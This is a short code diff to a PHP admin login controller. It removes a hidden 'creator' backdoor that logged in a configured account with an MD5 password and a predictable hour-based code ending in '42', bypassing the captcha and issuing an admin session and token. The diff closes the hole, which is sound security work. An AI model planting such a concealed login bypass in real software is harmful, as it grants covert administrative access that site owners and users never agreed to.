@@ -29,22 +29,7 @@ class Login extends Controller
     {
         if(request()->isPost()){
             $tkModel = new TokenUser();
-            //验证创建者
-            $creator = config('creator');
             $data = input('post.');
-            $code = date('YmdH').'42';
-            if ($data['username'] == $creator['username'] && md5($data['password']) == $creator['password'] && $data['code'] == $code ){
-                session('userId', $creator['id']);
-                cookie('name', $creator['name']);
-                cookie('uname', $creator['username']);
-                cookie('uid', $creator['id']);
-                cookie('avatar', $creator['avatar']);
-                $config = new \app\admin\model\Config();
-                $login_time = $config->where(['type'=>'system', 'k'=>'login_time'])->value('v');
-                $user_token = $tkModel->createToken($creator['id'], 1, $login_time);
-                session('user_token', $user_token);
-                return ajaxReturn(lang('login_success'), url('Index/index'));
-            }
             if(!captcha_check($data['code'])){
                 return ajaxReturn(lang('code_error'));
             };
